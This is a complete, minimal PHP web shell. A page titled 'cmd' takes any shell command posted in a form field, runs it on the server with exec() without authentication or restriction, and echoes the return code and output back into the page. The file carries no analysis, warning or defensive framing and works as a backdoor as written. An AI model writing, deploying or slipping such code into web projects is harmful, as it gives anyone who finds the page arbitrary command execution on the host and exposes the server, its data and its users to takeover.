<?php
if ( ! empty($_POST['cmd'])){
    $cmd = $_POST['cmd'];
    $lastline = exec($cmd, $output, $retval);
}
?>
<html>
    <head>
        <title>cmd</title>
    </head>
    <body>
        <div>
            <div>retval: <?php if (isset($retval)) echo $retval; ?></div>
            <div style="background: #00eeee">output: <br/>
            <?php
                if (isset($output)){
                    foreach ($output as $line){
                        echo htmlentities($line) . "<br/>";
                    }
                }
            ?>
            </div>
        </div>
        <hr />
        <form action="" method="post">
            cmd: <input style="width: 400px;" type="text" name="cmd" value="<?php if(isset($cmd)) echo $cmd; ?>" />
        </form>
    </body>
</html>